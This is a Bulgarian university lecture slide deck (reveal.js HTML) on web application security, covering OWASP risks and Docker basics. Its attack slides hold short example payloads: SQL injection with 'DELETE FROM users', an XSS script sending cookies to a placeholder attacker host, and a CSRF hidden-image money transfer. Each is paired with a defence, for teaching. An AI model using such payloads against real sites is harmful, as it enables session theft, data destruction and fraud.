<!doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

		<title>Сигурност на уеб приложения</title>

                <meta name="description" content=">Лекция към курса по Уеб технологии на спец. Информационни системи, 2020/21 г.">
		<meta name="author" content="Трифон Трифонов">


		<link rel="stylesheet" href="dist/reset.css">
		<link rel="stylesheet" href="dist/reveal.css">
		<link rel="stylesheet" href="dist/theme/simple.css" id="theme">

                <!-- стилове, специфични за презентацията> -->
		<link rel="stylesheet" href="webtech.css">

		<!-- Theme used for syntax highlighted code -->
		<link rel="stylesheet" href="plugin/highlight/monokai.css" id="highlight-theme">
	</head>
	<body>
		<div class="reveal">
			<div class="slides">
				<section>
                                        <h1>Сигурност на уеб приложения</h1>
                                        <h3>Уеб технологии, спец. Информационни системи, 2020/21 г.</h>
                                        <h4>Тази презентацията е достъпна под лиценза Creative Commons Признание-Некомерсиално-Споделяне на споделеното 4.0 Международен</h4>
                                </section>
                                <section>
                                        <section>
                                                <h1>Информационна сигурност</h1>
                                        </section>
                                        <section>
                                                <h2>Информацията като актив</h2>
                                                <ul>
                                                        <li>информацията е ценен <strong>актив (asset)</strong></li>
                                                        <li>заплахи над информацията:
                                                                <ul>
                                                                        <li>загуба</li>
                                                                        <li>неправомерен достъп</li>
                                                                        <li>неправомерно разпространение</li>
                                                                        <li>неправомерна употреба</li>
                                                                        <li>неправомерно възпроизвеждане</li>
                                                                        <li>неправомерна промяна</li>
                                                                </ul>
                                                        </li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Какво е информационна сигурност?</h2>
                                                <p>
                                                        Методи за защита на информацията от заплахи
                                                </p>
                                                <ul>
                                                        <li>превантивни мерки</li>
                                                        <li>наблюдение</li>
                                                        <li>процеси и процедури</li>
                                                        <li>проверка</li>
                                                        <li>периодично обновяване</li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Преди компютрите</h2>
                                                <ul>
                                                        <li>основно физически и процедурни защити</li>
                                                        <li>защита на кореспонденцията (<em>пример: шифър на Цезар</em>)</li>
                                                        <li>защита от промяна (<em>пример: восъчен печат</em>)</li>
                                                        <li>нива на достъп (<em>пример: военни класификации</em>)</li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Преди мрежите</h2>
                                                <ul>
                                                        <li class="fragment">вируси, разрушаващи данни
                                                                <ul>
                                                                        <li><strong>защита:</strong> антивирусни програми</li>
                                                                </ul>
                                                        </li>
                                                        <li class="fragment">неправомерно възпроизвеждане на интелектуална собственост (<em>пиратство</em>)
                                                                <ul>
                                                                        <li><strong>защита:</strong> техники за защита от копиране</li>
                                                                </ul>
                                                        </li>
                                                        <li class="fragment">неправомерен достъп до данни при физически достъп
                                                                <ul>
                                                                        <li><strong>защита:</strong> криптографски алгоритми</li>
                                                                </ul>
                                                        </li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Мрежова сигурност</h2>
                                                <img style="height : 350px; margin: 0 auto 0 auto;" src="http://www.referati.org/ufiles/2010-11-11/39633/mrejova-arhitektura-modelyt-osi_html_39f3eb27.jpg"/>
                                                <p class="fragment">
                                                        Ще обърнем внимание основно на приложния и представителния слой
                                                </p>
                                        </section>
                                </section>
                                <section>
                                        <section>
                                                <h1>Сигурност на уеб приложения</h1>
                                        </section>
                                        <section>
                                                <h2>Основни понятия</h2>
                                                <ul>
                                                        <li class="fragment"><strong>актив (asset)</strong> &mdash; ценен ресурс: данни, пари/точки по сметка, системни файлове, код, компютърно време, мрежова връзка</li>
                                                        <li class="fragment"><strong>уязвимост (vulnerability)</strong> &mdash; аспект на системата, който позволява неупълномощен достъп до актив</li>
                                                        <li class="fragment"><strong>атака (attack)</strong> &mdash; действие причиняващо вреда, свързана с един или повече активи</li>
                                                        <li class="fragment"><strong>заплаха (threat)</strong> &mdash; потенциална атака над актив, обикновено свързана с използване на една или повече уязвимости</li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Троицата CIA</h2>
                                                <ul>
                                                        <li><strong>Поверителност (Confidentiality)</strong> &mdash; защита от неправомерен достъп</li>
                                                        <li><strong>Цялостност (Integrity)</strong> &mdash; коректност и защита от неправомерна промяна</li>
                                                        <li><strong>Наличност (Availability)</strong> &mdash; лесен достъп за упълномощените лица</li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Open Web Application Security Project (OWASP)</h2>
                                                <p>
                                                        <a href="https://owasp.org/" target="_blank">OWASP</a> е фондация с идеална цел, посветена на подобряване на сигурността на уеб приложения
                                                </p>
                                                <p>
                                                        <a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10 Web Application Security Risks</a>
                                                </p>
                                        </section>
                                        <section>
                                                <h2>OWASP &mdash; полезни ресурси</h2>
                                                <ul>
                                                        <li><a href="https://github.com/OWASP/DevGuide">OWASP Development Guide</a> &mdash; препоръки за разработка на сигурен софтуер</li>
                                                        <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/">OWASP Testing Guide</a> &mdash; препоръки за тестване на сигурността на приложенията</li>
                                                        <li><a href="https://owasp.org/www-project-webgoat/">WebGoat</a> &mdash; уеб приложение на Java за обучителни цели, разработено нарочно с много уязвимости</li>
                                                        <li><a href="https://owasp.org/www-project-zap/">Zed Attack Proxy (ZAP)</a> &mdash; инструмент за анализ на уязвимости на уеб приложения</li>
                                                        <li><a href="https://owasp.org/www-project-juice-shop/">Juice Shop</a> &mdash; Node.js приложение с нарочно оставени уязвимости с обучителни цели</li>
                                                </ul>
                                        </section>
                                </section>
                                <section>
                                        <section>
                                                <h1>Популярни рискове и атаки над уеб приложения</h1>
                                        </section>
                                        <section>
                                                <h2>Инжектиране на команди (Injection)</h2>
                                                <ul>
                                                        <li><strong>Уязвимост:</strong> очакват се данни, които да бъдат попълнени като параметри в команда</li>
                                                        <li><strong>Атака:</strong> в данните могат да се съдържат специални символи, които да се интерпретират като част от командата и да се промени нейното действие</li>
                                                        <li><strong>Пример (SQL injection):</strong><br>
                                                                <pre><code class="language-sql hljs" data-trim>
                                                                                query = "SELECT * FROM users WHERE id = " + id;

                                                                                https://example.com/profile.php?id=2 OR 1=1
                                                                                https://example.com/profile.php?id=2; DELETE FROM users
                                                                </code></pre>
                                                        </li>
                                                        <li><strong>Защита:</strong> премахване или маскиране на специални символи, параметризирани заявки</li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Cross-site scripting (XSS)</h2>
                                                <ul>
                                                        <li><strong>Уязвимост:</strong> уеб страница визуализира данни, въведени от потребителя или подадени от браузъра, директно в HTML кода</li>

                                                        <li><strong>Атака:</strong> в данните може да се сложи JavaScript, който да се изпълнява от името на потребителя и сайта</li>
                                                        <li><strong>Пример:</strong><br>
                                                                <pre><code class="language-php hljs" data-trim>
                                                                                &lt;p&gt;Коментар:&lt;br&gt;&lt;?= $userComment ?&gt;&lt;/p&gt;

                                                                                &lt;script&gt;window.location="http://bad.guy/?cookie=" + document.cookie&lt;/script&gt;
                                                                                &lt;img src="logo.png" onload="var xhr=new XMLHttpRequest();\
                                                                                xhr.open('GET', '/authService/user/delete?name=bob', true);xhr.send();"/&gt;
                                                                </code></pre>
                                                        </li>
                                                        <li><strong>Защита:</strong> маскиране на специалните символи, Content-Security-Policy (CSP)</li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Проблеми с удостоверяването (authentication)</h2>
                                                <ul>
                                                        <li><strong>Уязвимост:</strong> логически пропуск при проверка за удостоверяване на потребител</li>
                                                        <li><strong>Атака:</strong> създаване на специална заявка, която да се възползва от логическия пропуск така, че сървърът да ни разпознае като друг потребител</li>
                                                        <li><strong>Пример:</strong><br>
                                                                <pre><code class="hljs" data-trim>
                                                                                logged = true;
                                                                                if (password && hash(password) != correctHash)
                                                                                	logged = false;
                                                                </code></pre>
                                                        </li>
                                                        <li><strong>Защита:</strong> използване на стандартен компонент за управление на сесии</li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Проблеми с упълномощаването (authorization)</h2>
                                                <ul>
                                                        <li><strong>Уязвимост:</strong> логически пропуск при проверка дали потребител има право да достъпи дадена страница</li>
                                                        <li><strong>Атака:</strong> модифициране на стандартна заявка, така че да извършваме действия, за които не би трябвало да изпълним през потребителския интерфейс</li>
                                                        <li><strong>Пример:</strong><br>
                                                                <pre><code class="hljs" data-trim>
                                                                                http://example.com/edit-profile
                                                                                http://example.com/edit-profile?username=admin
                                                                </code></pre>
                                                        </li>
                                                        <li><strong>Защита:</strong> отказ на достъп по подразбиране, валидиране на бисквитка или жетон (token) при всяка заявка</li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Подправяне на заявки<br>(Cross-Site Request Forgery &mdash; CSRF)</h2>
                                                <ul>
                                                        <li><strong>Уязвимост:</strong> обработка на заявка с неясен произход</li>
                                                        <li><strong>Атака:</strong> подвеждане на браузъра на потребителя да генерира заявка от негово име към сайт, в който се е удостоверил</li>
                                                        <li><strong>Пример:</strong><br>
                                                                <pre><code class="hlhtml" data-trim>
                                                                                Hi! You have won $1,000,000!
                                                                                Click &lt;a href="https://lame.bank/send?to=BADGUY&sum=10000"&gt;here&lt;/a&gt;
                                                                                to claim your prize!

                                                                                &lt;img src="https://lame.bank/send?to=BADGUY&sum=10000" width="0" height="0"/&gt;
                                                                </code></pre>
                                                        </li>
                                                        <li><strong>Защита:</strong> валидиране на жетон (token) при всяка заявка, използване на съвременна рамка за приложения</li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Използване на уязвими компоненти</h2>
                                                <ul>
                                                        <li><strong>Уязвимост:</strong> стандартен компонент с отворен код има известна уязвимост</li>
                                                        <li><strong>Атака:</strong> изпълняване на библиотека от стандартни атаки срещу всички потенциално уязвими компоненти на сайта</li>
                                                        <li><strong>Пример:</strong>
                                                                <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5638">CVE-2017-5638</a>
                                                                <blockquote style="font-size: .6em">
                                                                        The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message generation during file-upload attempts, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header.
                                                                </blockquote>
                                                        </li>
                                                        <li><strong>Защита:</strong> внимателно подбиране на компоненти за вграждане (поддържани ли са, от сигурен източник ли са), следене за обновления по сигурността</li>
                                                </ul>
                                        </section>
                                </section>
                                <section>
                                        <section>
                                                <h1>Docker</h1>
                                        </section>
                                        <section>
                                                <h2>Виртуални машини</h2>
                                                <p>Програми, които софтуерно реализират хардуер</p>
                                                <p class="fragment"><strong>Предимства:</strong></p>
                                                <ul>
                                                        <li class="fragment">програми за една хардуерна архитектура върху друга</li>
                                                        <li class="fragment">копия и "снимки" на състоянието на машината</li>
                                                        <li class="fragment">изолация</li>
                                                </ul>
                                                <p class="fragment"><strong>Недостатъци:</strong></p>
                                                <ul>
                                                        <li class="fragment">ресурсоемки</li>
                                                        <li class="fragment">отделна операционна система</li>
                                                        <li class="fragment">трудна преносимост</li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Контейнери</h2>
                                                <p>Изолирани потребителски пространства, споделящи ОС и библиотеки</p>
                                                <p class="fragment"><strong>Предимства:</strong></p>
                                                <ul>
                                                        <li class="fragment">пестеливи откъм ресурси</li>
                                                        <li class="fragment">лесно преносими</li>
                                                        <li class="fragment">бързо създаване и стартиране</li>
                                                </ul>
                                                <p class="fragment"><strong>Недостатъци:</strong></p>
                                                <ul>
                                                        <li class="fragment">зависят от споделената ОС</li>
                                                        <li class="fragment">по-слаба изолация</li>
                                                </ul>
                                        </section>
                                        <section>
                                                <h2>Основни команди на Docker</h2>
                                                <div class="fragment">Стартиране на контейнер:
                                                        <pre><code class="language-bash hljs" data-trim>docker run --name mycontainer hello-world</code></pre></div>
                                                <div class="fragment">Спиране на контейнер:
                                                        <pre><code class="language-bash hljs" data-trim>
                                                                        docker kill mycontainer
                                                </code></pre></div>
                                                <div class="fragment">Налични контейнери:
                                                        <pre><code class="language-bash hljs" data-trim>
                                                                        docker ps [-a]
                                                </code></pre></div>
                                                <div class="fragment">Изтриване на контейнер:
                                                        <pre><code class="language-bash hljs" data-trim>
                                                                        docker rm [-f] mycontainer
                                                </code></pre></div>
                                        </section>
                                        <section>
                                                <h2>Пускане на уеб сървър под Docker</h2>
                                                <pre><code class="language-bash hljs" data-trim>
                                                                docker run --name myserver \
                                                                           -p 8080:80 \
                                                                           -v /home/trifon/myapp:/usr/share/nginx/html:ro \
                                                                           -d nginx
                                                </code></pre>
                                                <div class="fragment">Инспектиране на контейнера:
                                                        <pre><code class="language-bash hljs" data-trim>
                                                                        docker exec -it myserver bash
                                                        </code></pre>
                                                </div>
                                        </section>
                                        <section>
                                                <h2>Построяване на образи (images)</h2>
                                                <p>Образите на контейнерите се описват с последователност от инструкции в Dockerfile</p>
                                                <pre><code class="language-dockerfile hljs" data-trim>
                                                                FROM ubuntu:20.04
                                                                MAINTAINER triffon@fmi.uni-sofia.bg
                                                                COPY mine_dogecoin.sh /root/
                                                                RUN useradd -p doge miner
                                                                CMD mine_dogecoin.sh
                                                </code></pre>
                                                <div class="fragment">Построяване на образа:
                                                        <pre><code class="language-bash hljs" data-trim>
                                                                        docker build -t dogeminer .
                                                        </code></pre>
                                                </div>
                                        </section>
                                        <section>
                                                <h2>Docker Hub</h2>
                                                <div class="fragment">Локално сваляне на образ на контейнер:
                                                        <pre><code class="language-bash hljs" data-trim>
                                                                        docker pull ubuntu:20.04
                                                </code></pre></div>
                                                <div class="fragment">Списък с локално налични образи:
                                                        <pre><code class="language-bash hljs" data-trim>
                                                                        docker images
                                                </code></pre></div>
                                                <div class="fragment">Изтриване на локален образ:
                                                        <pre><code class="language-bash hljs" data-trim>
                                                                        docker rmi ubuntu
                                                </code></pre></div>
                                                <div class="fragment">Публикуване на образ:
                                                        <pre><code class="language-bash hljs" data-trim>
                                                                        docker push dogeminer:latest
                                                </code></pre></div>
                                        </section>
                                </section>
                                <section>
                                        <h1>Въпроси?</h1>
                                </section>
			</div>
		</div>

		<script src="dist/reveal.js"></script>
		<script src="plugin/notes/notes.js"></script>
		<script src="plugin/markdown/markdown.js"></script>
		<script src="plugin/highlight/highlight.js"></script>
		<script>
			// More info about initialization & config:
			// - https://revealjs.com/initialization/
			// - https://revealjs.com/config/
			Reveal.initialize({
				hash: true,

				// Learn about plugins: https://revealjs.com/plugins/
				plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ]
			});
		</script>
	</body>
</html>
